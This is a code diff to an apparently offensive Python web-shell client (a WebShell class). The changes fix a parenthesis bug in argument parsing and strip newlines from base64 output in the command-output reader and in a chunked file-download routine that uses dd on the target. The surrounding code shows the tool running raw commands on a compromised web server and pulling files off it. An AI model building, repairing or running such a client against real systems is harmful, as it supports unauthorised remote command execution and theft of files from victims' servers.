@@ -52,7 +52,7 @@ class WebShell(object):
 
     # Read $session, output text to screen & wipe session
     def ReadThread(self):
-        GetOutput = f"/bin/cat {self.stdout} | python -m base64"
+        GetOutput = f"/bin/cat {self.stdout} | python -m base64 | tr -d '\\n'"
         while True:
             result = self.RunRawCmd(GetOutput) #, proxy=None)
             if result:
@@ -147,7 +147,7 @@ while True:
             print("[-] Usage: upload <src> [dst]")
         else:
             src = splitted[1]
-            dst = splitted[2] if len(splitted>2) else splitted[1].split('/')[-1]
+            dst = splitted[2] if len(splitted)>2 else splitted[1].split('/')[-1]
             fd = open(src, 'rb')
             while True:
                 data = fd.read(1024)
@@ -163,11 +163,11 @@ while True:
             print("[-] Usage: download <src> [dst]")
         else:
             src = splitted[1]
-            dst = splitted[2] if len(splitted>2) else splitted[1].split('/')[-1]
+            dst = splitted[2] if len(splitted)>2 else splitted[1].split('/')[-1]
             i = 0
             fd = open(dst, 'wb', buffering=0)
             while True:
-                datab64 = exec_com(f"dd skip={i*1024} count=1024 if={src} bs=1 status=none | python -m base64")
+                datab64 = exec_com(f"dd skip={i*1024} count=1024 if={src} bs=1 status=none | python -m base64 | tr -d '\\n'")
                 if not datab64:
                     break
                 data = base64.b64decode(datab64)
